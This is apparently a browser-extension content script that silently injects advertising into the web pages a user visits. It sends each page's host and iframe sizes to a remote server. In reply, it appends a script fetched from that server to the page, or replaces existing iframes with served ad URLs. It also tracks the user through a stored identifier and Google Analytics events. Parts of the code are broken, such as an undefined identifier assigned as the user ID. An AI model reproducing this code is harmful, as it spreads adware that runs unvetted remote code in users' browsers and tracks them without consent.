;(function () {
    var APP_ID = 1160409269;
    var GA_ID = 'UA-71834233-1';
    var RECOMMEND_COUNT = 30;
    var RECOMMEND_URL = '//admin.goextension.com/api/get-ad';
    var UUID_URL = 'http://127.0.0.1:7777/uid';
    var LOCALSTORAGE_UUID_NAME = 'uuid_gpf_tzof';

    /*
     * add
     * */
    ;(function () {

        // 
        var bAd = true;

        // 
        function getData (aAdId) {
            /**
             * iframe
             * @type {NodeList}
             */
            var oIframe = document.getElementsByTagName('iframe'),
                aIframe = [],   //iframe
                aSize = [];     //iframe
            for(var i=0 ; i<oIframe.length ; i++){
                if(oIframe[i].offsetWidth || oIframe[i].offsetHeight){
                    aSize.push(oIframe[i].offsetWidth+'*'+oIframe[i].offsetHeight);
                    aIframe.push(oIframe[i]);
                }
            }
            //host
            var web = window.location.host;
            /**
             * @type {size : Array,count : Number,web : string,appid : stringrete : Array}
             * size : iframe
             * count : iframe
             * web : url
             * appid : appid
             * rate :  
             */
            var data = {
                size : aSize,
                count : aSize.length,
                web : web,
                appid : APP_ID,
                rate : aAdId
            };
            return data;
        }

        // 
        function recommend(data) {
            $.ajax({
                url : RECOMMEND_URL,
                type : 'post',
                data : data,
                success : function (json) {
                    // 40003    
                    // 40004    
                    // 40005    
                    if( json.code == 40003 || json.code == 40004 || json.code == 40005 )return;
                    var data = json.data;
                    // js
                    if( data.type == 1 ){
                        $('<script></script>').attr('src', data.list[0]).appendTo('body');
                        var adId = data.list['id'];
                        // idbackground,backgroundlocalStorage
                        if( adId ){
                            localStorage['adId'] = adId;
                        }
                        // 
                    }else if( data.type == 2 ){
                        for(var i=0 ; i<data.list.length ; i++){
                            var bFlag = true;
                            var width = data.list[i].size.split('*')[0],
                                height = data.list[i].size.split('*')[1],
                                url = data.list[i].url;

                            for(var j=i ; j<aIframe.length ; j++){
                                var iIframeWidth = aIframe[j].offsetWidth,
                                    iIframeHeight = aIframe[j].offsetHeight;
                                if( iIframeWidth == width && iIframeHeight == height && bFlag && !aIframe[j].getAttribute('bFlag') ){
                                    aIframe[j].src = url;
                                    aIframe[j].setAttribute('bFlag', true);
                                    bFlag = false;
                                }
                            }
                        }
                    }
                },
                error : function () {
                    console.log('');
                }
            })
        }

        // adId
        function addRecommend () {
            recommend(getData(''));
        }

        // 
        var $plug = $('#chrome_plug_flag_1_0_0');
        if(!$plug.length) {
            $plug = $('<div></div>').attr('id', 'chrome_plug_flag_1_0_0').css('display', 'none').appendTo('body');
            addRecommend();
        }

    })();


    /*
     * @Class   
     * @*       mdata  GA
     * @return  Report
     * */
    ;(function () {
        var root = window || this;
        var isUuid = false;

        /**
         * [mData description] 
         */
        root.mData = window.mData || [];

        /**
         * [ga description] 
         */
        root._gaq = window._gaq || [];
        _gaq.push(["_setAccount", GA_ID]);

        // 
        var Report = {
            // 
            queue : [],

            /*
             * @method 
             * @param {string} method 
             * @param {array} params 
             * */
            pushQueue : function (method, params) {
                this.queue.push((function (method, params) {
                    return function () {
                        Report[method].apply(Report, params);
                    }
                })(method, params));
            },

            // 
            runQueue : function () {
                this.queue.forEach(function (val, index) {
                    val();
                });
                this.queue = [];
            },

            /*
             * @method 
             * @param {string} eventName 
             * @return {boolean}
             * */
            eventTodayIsReported : function (eventName) {
                var current = new Date();
                var currentYear = current.getFullYear(),
                    currentMonth = current.getMonth(),
                    currentDay = current.getDate();
                var eventDateString = localStorage.getItem('report_' + eventName);

                // 
                if(!eventDateString) {
                    return false;
                }

                // 
                var eventDate = new Date(eventDateString);
                if(eventDate.getFullYear() != currentYear || eventDate.getMonth() != currentMonth || eventDate.getDate() != currentDay) {
                    return false;
                }

                return true;
            },

            /*
             * @method 
             * @param {string} eventName 
             * @return {boolean}
             * */
            eventIsReported : function (eventName) {
                if(localStorage['report_' + eventName]) {
                    return true;
                }

                return false;
            },

            /*
             * @method 
             * @param {string} eventName 
             * */
            setEventReportDate : function (eventName) {
                localStorage.setItem('report_' + eventName, new Date());
            },

            // ga
            ga : function (eventName) {
                _gaq.push(["_trackEvent", eventName, localStorage[LOCALSTORAGE_UUID_NAME]]);
            },

            // mdata
            mdata : function (eventName) {
                mData.push(['send', eventName, {
                    appid: APP_ID,
                    uuid : localStorage[LOCALSTORAGE_UUID_NAME]
                }]);
            },

            /*
             * 
             * */
            onlyOne : function (eventName) {
                var self = this;

                // uuid == null
                if(!isUuid) {
                    self.pushQueue('onlyOne', arguments);
                    return;
                }

                if(!eventName) {
                    return;
                }

                // 
                if(self.eventIsReported(eventName)) {
                    return;
                }

                // 
                self.setEventReportDate(eventName);
                self.mdata(eventName);
                self.ga(eventName);
            },

            /*
             * 
             * */
            oneDayOne : function (eventName) {
                var self = this;

                // uuid == null
                if(!isUuid) {
                    self.pushQueue('oneDayOne', arguments);
                    return;
                }

                if(!eventName) {
                    return;
                }

                // 
                if(self.eventTodayIsReported(eventName)) {
                    return;
                }

                // DAU,,adId
                if(eventName == 'visit') {
                    delete localStorage.adId;
                }

                // 
                self.setEventReportDate(eventName);
                self.mdata(eventName);
                self.ga(eventName);
            },

            /*
             * 
             * */
            infinite : function (eventName) {
                var self = this;

                // uuid == null
                if(!isUuid) {
                    self.pushQueue('infinite', arguments);
                    return;
                }

                if(!eventName) {
                    return;
                }

                // 
                self.mdata(eventName);
                self.ga(eventName);
            }
        };

        // 
        var util = {
            /*
             * @method uuid
             * */
            initUuid : (function () {
                localStorage[LOCALSTORAGE_UUID_NAME] = GUO_PENG_FEI_pogjnflbicmnclloeejekilbkdengnnk_TZOF_T_T;
                isUuid = true;
                Report.runQueue();
            })(),

            /*
             * @method Id
             * @return {string} extensionId
             * */
            getExtensionId : function () {
                var extensionId = 'gpfpogjnflbicmnclloeejekilbkdengnnk';
                if(!extensionId) {
                    throw 'Id';
                }
                return extensionId;
            },

            /*
             * @method uuid
             * @* localStorageuuid
             * @return {string} uuid
             * */
            CreateUuid : function () {
                var uuid = localStorage[LOCALSTORAGE_UUID_NAME];

                if(uuid) {
                    return uuid;
                }else {
                    uuid = 'autoid_' + util.getExtensionId() + '_' + new Date().getTime() + '_' + parseInt(Math.random()*999);
                }

                return uuid;
            }
        };

        /*
         * @method mdata  GA
         * @param {String} eventName 
         * */
        if(typeof exports !== 'undefined') {
            if(typeof module !== 'undefined' && module.exports) {
                exports = module.exports = Report;
            }
            exports.Report = Report;
        } else if (typeof define === 'function' && define.amd) {
            define('Report', function () {
                return Report;
            });
        } else {
            root.Report = Report;
        }

    }).call(this);
})();

